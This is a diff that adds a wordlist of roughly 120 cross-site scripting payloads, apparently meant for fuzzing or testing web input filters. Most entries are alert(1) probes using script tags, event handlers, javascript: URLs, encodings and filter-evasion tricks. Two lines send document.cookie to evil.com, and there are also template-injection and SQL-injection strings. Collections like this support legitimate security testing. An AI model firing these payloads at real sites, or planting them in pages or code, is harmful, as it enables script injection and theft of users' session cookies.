@@ -1,0 +1,121 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<SCRIPT>alert(1)</SCRIPT>
+<Script>alert(1)</Script>
+<sCrIpT>alert(1)</sCrIpT>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"></script><script>alert(1)</script>
+"><script>alert(document.cookie)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(document.cookie)>
+<img src="x" onerror="alert(1)">
+<img src='x' onerror='alert(1)'>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+<IMG SRC=x ONERROR=alert(1)>
+<img/src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<svg onload=alert('XSS')>
+<SVG ONLOAD=alert(1)>
+"><svg onload=alert(1)>
+'><svg onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+<svg onload="alert(1)">
+<body onload=alert(1)>
+<BODY ONLOAD=alert(1)>
+<body onpageshow=alert(1)>
+<iframe onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<iframe src=javascript:alert(1)>
+"><iframe src=javascript:alert(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+javascript:alert(1)
+javascript:alert(document.cookie)
+JAVASCRIPT:alert(1)
+<a href=javascript:alert(1)>click</a>
+<a href="javascript:alert(1)">XSS</a>
+"><a href=javascript:alert(1)>XSS</a>
+<input onfocus=alert(1) autofocus>
+<input onmouseover=alert(1)>
+<input autofocus onfocus=alert(1)>
+"><input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<button onclick=alert(1)>XSS</button>
+<details open ontoggle=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<base href=javascript:alert(1)//>
+<meta http-equiv=refresh content="0;url=javascript:alert(1)">
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+\u003cscript\u003ealert(1)\u003c/script\u003e
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<<script>alert(1)</script>
+<script >alert(1)</script>
+<script	>alert(1)</script>
+<script language=javascript>alert(1)</script>
+<script type=text/javascript>alert(1)</script>
+<script defer>alert(1)</script>
+<script async>alert(1)</script>
+</script><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</title><script>alert(1)</script>
+"-prompt(1)-"
+'-prompt(1)-'
+${alert(1)}
+{{7*7}}
+{{alert(1)}}
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set onbegin=alert(1) attributeName=x>
+<x onclick=alert(1)>click me
+<script>window['alert'](1)</script>
+<script>eval('ale'+'rt(1)')</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<script>Function('alert(1)')()</script>
+<script>setTimeout('alert(1)',0)</script>
+<img src=x:alert(1) onerror=eval(src)>
+<ScRiPt>alert(1)</sCrIpT>
+<IMG SRC=x ONERROR=alert(1)>
+<img\tsrc=x\tonerror=alert(1)>
+<img\nsrc=x\nonerror=alert(1)>
+<img src=`x` onerror=alert(1)>
+<svg><script>alert(1)</script></svg>
+" onmouseover=alert(1) x="
+' onmouseover=alert(1) x='
+" onfocus=alert(1) autofocus "
+';alert(1)//
+";alert(1)//
+`-alert(1)-`
+" onclick=alert(1) "
+ onmouseover=alert(1)>
+><script>alert(1)</script>
+<form><button formaction=javascript:alert(1)>XSS
+<table><td background=javascript:alert(1)>
+<link rel=stylesheet href=javascript:alert(1)>
+<style>@import'javascript:alert(1)'</style>
+<div style="width:expression(alert(1))">
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+<object data="data:text/html,<script>alert(1)</script>">
+<iframe srcdoc='<script>alert(1)</script>'>
+<math><mtext></table></math><script>alert(1)</script>
+%27%20OR%20%271%27%3D%271
+<script>fetch('https://evil.com?c='+document.cookie)</script>
+<script>new Image().src='http://evil.com/?c='+document.cookie</script>
+<script>location='javascript:alert(1)'</script>
+<script>window.location='javascript:alert(1)'</script>
+<xss onafterscriptexecute=alert(1)><script>1</script>
+<xss onfocusin=alert(1) id=x tabindex=1>#x
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<marquee onstart=alert(1)>
+<isindex type=image src=1 onerror=alert(1)>
+<script>alert(/XSS/.source)</script>
+<script>alert`1`</script>
